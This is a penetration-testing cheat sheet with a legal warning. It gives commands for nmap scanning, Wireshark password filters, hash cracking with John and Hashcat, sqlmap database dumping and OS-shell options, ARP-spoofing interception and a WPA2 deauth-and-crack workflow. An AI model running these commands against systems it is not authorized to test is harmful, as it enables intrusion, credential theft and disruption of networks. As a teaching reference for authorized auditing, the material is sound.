# Essential Security Tools

`#redteam` `#nmap` `#wifi` `#cracking`

The hacker's toolbox—essential tools for penetration testing and security auditing.

---

!!! danger "Legal Warning"
    These tools are for **educational use** or **authorized security audits ONLY**.

    Using them on networks, systems, or applications you don't own or have explicit written permission to test is **illegal** and can result in criminal prosecution.

    **Always get written authorization before testing.**

---

## Category 1: Network Reconnaissance

### Nmap — "The Mapper"

The industry-standard network scanner. Discovers hosts, open ports, services, and OS versions.

```bash
# Basic scan
nmap 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection + scripts + version
nmap -A 192.168.1.1

# Full TCP port scan
nmap -p- 192.168.1.1

# Stealth SYN scan (requires root)
sudo nmap -sS 192.168.1.1

# UDP scan (slow but important)
sudo nmap -sU --top-ports 100 192.168.1.1

# Scan entire subnet
nmap 192.168.1.0/24

# Output to all formats
nmap -oA scan_results 192.168.1.1
```

**Common Scripts (NSE):**

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.1

# SMB enumeration
nmap --script smb-enum-shares 192.168.1.1

# HTTP enumeration
nmap --script http-enum 192.168.1.1
```

| Flag | Purpose |
|------|---------|
| `-sS` | SYN stealth scan |
| `-sV` | Version detection |
| `-sC` | Default scripts |
| `-O` | OS detection |
| `-A` | Aggressive (OS + version + scripts + traceroute) |
| `-p-` | All 65535 ports |
| `-Pn` | Skip host discovery (assume online) |
| `-T4` | Faster timing |

---

### Wireshark — "The Microscope"

Deep packet inspection and analysis. See exactly what's on the wire.

**Use Cases:**

- Analyze suspicious network traffic
- Debug application protocols
- Capture credentials on unencrypted protocols
- Investigate malware communication

**Common Filters:**

```
# Filter by IP
ip.addr == 192.168.1.100

# Filter by protocol
http
dns
tcp.port == 443

# Filter HTTP requests
http.request.method == "POST"

# Find passwords (unencrypted)
http contains "password"

# TCP handshake issues
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Follow TCP stream
Right-click packet → Follow → TCP Stream
```

**Quick Capture:**

```bash
# CLI capture with tshark
tshark -i eth0 -w capture.pcap

# Capture specific port
tshark -i eth0 -f "port 80" -w http_traffic.pcap
```

---

## Category 2: Password Cracking (Offline)

### Understanding: Hashing vs Encryption

| Concept | Hashing | Encryption |
|---------|---------|------------|
| **Direction** | One-way (irreversible) | Two-way (reversible) |
| **Purpose** | Verify integrity | Protect confidentiality |
| **Key required** | No | Yes |
| **Example** | SHA256, bcrypt, MD5 | AES, RSA, ChaCha20 |

**Password cracking** = Given a hash, find the original password by trying millions of guesses.

---

### John the Ripper

Fast, versatile password cracker supporting 100+ hash formats.

```bash
# Identify hash type
john --list=formats | grep -i sha

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Crack with rules (mutations)
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=raw-sha256 hashes.txt
```

**Supported formats:**

- Linux shadow (`/etc/shadow`)
- Windows NTLM
- ZIP/RAR passwords
- Office documents
- SSH keys
- And many more...

---

### Hashcat — GPU-Accelerated Cracking

Faster than John using GPU power. Essential for large-scale cracking.

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hash.txt rockyou.txt

# With rules
hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule

# Brute-force (mask attack)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Show results
hashcat --show hash.txt
```

**Common Hash Modes (-m):**

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1000 | NTLM (Windows) |
| 1800 | SHA512crypt (Linux) |
| 3200 | bcrypt |
| 13100 | Kerberos TGS |

**Mask Characters:**

| Mask | Characters |
|------|------------|
| `?l` | Lowercase (a-z) |
| `?u` | Uppercase (A-Z) |
| `?d` | Digits (0-9) |
| `?s` | Special characters |
| `?a` | All printable |

---

## Category 3: Web & Database

### SQLMap — SQL Injection Automation

Automates detection and exploitation of SQL injection vulnerabilities.

!!! warning "Very Noisy"
    SQLMap generates hundreds of requests. **Never use on production systems without authorization.** It will trigger every WAF and IDS alarm.

```bash
# Basic test
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With cookie/session
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dump

# Get shell (if possible)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Specify database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

**Useful Flags:**

| Flag | Purpose |
|------|---------|
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump data |
| `--level=5` | Maximum test level |
| `--risk=3` | Maximum risk (more tests) |
| `--batch` | Non-interactive mode |

---

## Category 4: Man-in-the-Middle (MitM)

### Ettercap — ARP Spoofing

Intercept traffic on a LAN by poisoning ARP tables.

**How ARP Spoofing Works:**

```
Normal:
Victim → Switch → Gateway → Internet

After ARP Poisoning:
Victim → Switch → [Attacker] → Gateway → Internet
         ↑
    Attacker tells victim:
    "I'm the gateway"
```

```bash
# GUI mode
sudo ettercap -G

# Text mode - ARP poisoning entire subnet
sudo ettercap -T -q -i eth0 -M arp:remote //192.168.1.1// //192.168.1.0/24//

# Target specific host
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
```

**Alternative: arpspoof + mitmproxy**

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof both directions
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# Intercept with mitmproxy
mitmproxy --mode transparent
```

!!! danger "Detection"
    ARP spoofing is easily detected by:

    - Static ARP entries
    - ARP monitoring tools (arpwatch)
    - Enterprise switches with DAI (Dynamic ARP Inspection)

---

## Category 5: Wireless Auditing

### Aircrack-ng Suite

Complete toolkit for WiFi security assessment.

**Components:**

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Enable monitor mode |
| `airodump-ng` | Capture packets, find networks |
| `aireplay-ng` | Inject packets, deauth clients |
| `aircrack-ng` | Crack captured handshakes |

**WPA2 Cracking Workflow:**

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Scan for networks
sudo airodump-ng wlan0mon

# 3. Target specific network (capture handshake)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauth client to force reconnect (in new terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. Wait for "WPA handshake" message in airodump

# 6. Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 7. Disable monitor mode when done
sudo airmon-ng stop wlan0mon
```

!!! tip "Faster Cracking"
    Convert capture to hashcat format for GPU acceleration:

    ```bash
    # Convert to hccapx
    cap2hccapx capture-01.cap capture.hccapx

    # Crack with hashcat
    hashcat -m 22000 capture.hccapx rockyou.txt
    ```

---

## Category 6: Reverse Engineering

### Ghidra — NSA's Disassembler

Free, open-source reverse engineering tool. Turns compiled binaries back into readable pseudo-code.

**Features:**

- Disassembly (binary → assembly)
- Decompilation (binary → C-like pseudo-code)
- Cross-references
- Function graphs
- Scripting (Python/Java)

**Installation:**

```bash
# Download from https://ghidra-sre.org/

# Or via package manager
sudo apt install ghidra  # Kali/Debian

# Run
ghidraRun
```

**Workflow:**

1. Create new project
2. Import binary (File → Import)
3. Double-click to open in CodeBrowser
4. Auto-analyze when prompted
5. Navigate functions in left panel
6. Press `F` on addresses to create functions
7. Rename variables/functions for clarity

**Keyboard Shortcuts:**

| Key | Action |
|-----|--------|
| `G` | Go to address |
| `L` | Rename/label |
| `T` | Retype variable |
| `;` | Add comment |
| `X` | Show cross-references |
| `Ctrl+E` | Edit bytes |

---

## Quick Reference Table

| Category | Tool | One-liner |
|----------|------|-----------|
| Port Scan | Nmap | `nmap -sCV -oA scan target` |
| Packet Analysis | Wireshark | GUI or `tshark -i eth0` |
| Hash Cracking | John | `john --wordlist=rockyou.txt hash.txt` |
| Hash Cracking (GPU) | Hashcat | `hashcat -m 0 -a 0 hash.txt rockyou.txt` |
| SQL Injection | SQLMap | `sqlmap -u "url?id=1" --dump` |
| ARP Spoofing | Ettercap | `ettercap -T -M arp:remote ///` |
| WiFi Audit | Aircrack-ng | `aircrack-ng -w wordlist capture.cap` |
| Reverse Engineering | Ghidra | GUI-based analysis |
